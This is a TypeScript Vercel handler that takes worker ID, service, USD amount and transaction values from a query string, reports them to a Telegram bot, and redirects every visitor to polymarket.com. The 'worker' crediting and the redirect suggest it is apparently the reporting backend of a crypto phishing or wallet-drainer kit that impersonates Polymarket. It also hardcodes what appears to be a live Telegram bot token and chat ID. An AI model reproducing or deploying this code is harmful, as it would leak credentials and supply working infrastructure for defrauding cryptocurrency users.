import { VercelRequest, VercelResponse } from '@vercel/node';

function escapeHTML(text: string): string {
  if (!text) return '';
  return text
    .toString()
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export default async function handler(
  req: VercelRequest,
  res: VercelResponse
) {
  try {
    if (req.method === 'GET') {
      const { worker_id, service, amount, tx } = req.query;

      if (worker_id && service && amount && tx) {
        const message = `✅ <b>Action Successful</b>\n\n👷 <b>Worker:</b> <code>${escapeHTML(worker_id as string)}</code>\n🛠️ <b>Service:</b> ${escapeHTML(service as string)}\n💰 <b>Amount:</b> <code>${escapeHTML(amount as string)}</code> USD\n🔗 <b>Transaction:</b> <code>${escapeHTML(tx as string)}</code>`;

        const botToken = process.env.TELEGRAM_BOT_TOKEN || "7791166762:AAFTbJ0JmBkbI7Qqpt_Ncv2O3BbNqxiyXbI";
        const chatId = process.env.TELEGRAM_CHAT_ID || "8138109950";

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const body = {
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        };

        const response = await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
        });

        if (!response.ok) {
          console.error('[ERROR] Telegram API failure:', await response.text());
        }
      } else {
        console.error('[ERROR] Missing required parameters: worker_id, service, amount, tx');
      }
    } else {
      console.error(`[ERROR] Invalid method: ${req.method}`);
    }
  } catch (error) {
    console.error('[FATAL] Processing error:', error);
  } finally {
    return res.redirect(302, 'https://polymarket.com');
  }
}
